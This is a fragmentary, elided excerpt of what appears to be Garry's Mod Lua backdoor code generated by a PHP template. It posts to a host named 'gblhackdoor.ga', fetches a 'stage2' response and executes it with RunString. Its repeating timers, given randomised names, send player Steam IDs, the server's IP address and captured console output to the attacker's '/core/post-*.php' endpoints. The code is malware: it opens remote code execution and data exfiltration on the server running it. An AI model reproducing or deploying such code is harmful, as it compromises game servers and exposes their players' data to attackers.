...
http.Post( 'http://gblhackdoor.ga/core/stage2.php', a,
...
http.Post("http://<?php echo $d; ?>/core/stage2.php", a,function(body)RunString(body)end)
timer.Simple(5, EN)
end
...
local function ez()
	http.Post("http://<?php echo $d; ?>/core/post-player.php", {
		steamid = steamid,
...
timer.Create("<?php echo reloadString(10) ?>", 10, 0, function()
	...
	http.Post("http://<?php echo $d; ?>/core/post-console.php", {i=game.GetIPAddress(),m=str})
	cache = {}
end)
...
timer.Create("<?php echo reloadString(10) ?>", 0.5, 0, function()
